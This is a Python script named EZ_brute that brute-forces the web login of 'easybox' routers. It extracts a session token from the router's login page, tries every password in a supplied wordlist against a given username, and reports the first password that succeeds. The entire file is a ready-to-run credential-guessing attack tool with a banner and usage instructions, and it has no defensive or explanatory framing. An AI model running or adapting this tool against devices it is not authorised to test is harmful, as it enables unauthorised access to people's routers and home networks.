import requests
import argparse
import re
from colorama import Fore, Style, init

# EZ_brute v.0.1
# easy bruteforcing your easyboxes - (c) 2024 suuhm

# usage: ez-brute.py [-h] --ip IP --username USERNAME --wordlist WORDLIST
#
# Login Brute-force Sc#ript
#
# options:
#  -h, --help           show this help message and exit
#  --ip IP              The IP address of the target device
#  --username USERNAME  The username for login
#  --wordlist WORDLIST  Path to the wordlist file


# Initialize colorama
init(autoreset=True)

def display_banner():
    banner = f"""
{Fore.GREEN}{Style.BRIGHT}
 ██████████ ███████████            ███████████  ███████████   █████  █████ ███████████ ██████████
░░███░░░░░█░█░░░░░░███            ░░███░░░░░███░░███░░░░░███ ░░███  ░░███ ░█░░░███░░░█░░███░░░░░█
 ░███  █ ░ ░     ███░              ░███    ░███ ░███    ░███  ░███   ░███ ░   ░███  ░  ░███  █ ░ 
 ░██████        ███     ██████████ ░██████████  ░██████████   ░███   ░███     ░███     ░██████   
 ░███░░█       ███     ░░░░░░░░░░  ░███░░░░░███ ░███░░░░░███  ░███   ░███     ░███     ░███░░█   
 ░███ ░   █  ████     █            ░███    ░███ ░███    ░███  ░███   ░███     ░███     ░███ ░   █
 ██████████ ███████████            ███████████  █████   █████ ░░████████      █████    ██████████
░░░░░░░░░░ ░░░░░░░░░░░            ░░░░░░░░░░░  ░░░░░   ░░░░░   ░░░░░░░░      ░░░░░    ░░░░░░░░░░ 

easy bruteforcing your easyboxes - v0.1a (c) 2024 suuhm
{Style.RESET_ALL}
        """
    print(banner)

def main():
    display_banner()

    # Define arguments
    parser = argparse.ArgumentParser(description='Login Brute-force Script')
    parser.add_argument('--ip', required=True, help='The IP address of the target device')
    parser.add_argument('--username', required=True, help='The username for login')
    parser.add_argument('--wordlist', required=True, help='Path to the wordlist file')
    args = parser.parse_args()

    # Target URL
    url = f"http://{args.ip}/cgi-bin/login.exe"

    # Create session
    session = requests.Session()

    # First request to extract token
    initial_response = session.get(url)

    # Extract token
    token_match = re.search(r"var _httoken = '(.*?)';", initial_response.text)
    
    if token_match:
        httoken = token_match.group(1)  # Extracted token
        print(f"{Fore.YELLOW}Extracted Token:{Style.RESET_ALL} {httoken}")
    else:
        print(f"{Fore.RED}Token not found. Exiting.{Style.RESET_ALL}")
        return  # Exit the script if token is not found

    # Username
    username = args.username

    # Read wordlist
    with open(args.wordlist, 'r') as file:
        password_list = [line.strip() for line in file]

    for password in password_list:
        # Insert login data into POST request
        login_data = {
            "httoken": httoken,
            "user": username,
            "pws": password
        }

        # Create query string
        query_string = '&'.join([f"{key}={value}" for key, value in login_data.items()])
        full_url = f"{url}?{query_string}"

        # Display the full URL with credentials
        print(f"{Fore.CYAN}Sent URL:{Style.RESET_ALL} {full_url}")

        # Send POST request
        login_response = session.post(url, data=login_data)

        # SET FOR DEBUGGING!
        # Display and check HTML response
        #print(f"\n{Fore.MAGENTA}HTML Response:{Style.RESET_ALL}")
        #print(login_response.text)

        # Check if login was successful
        if "setupa_brief.stm" in login_response.text:
            print(f"{Fore.GREEN}\nSuccessfully logged in with username: {username} and password: {password}{Style.RESET_ALL}")
            break  # Stop the loop on successful login
        else:
            print(f"{Fore.RED}\nLogin failed with username: {username} and password: {password}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
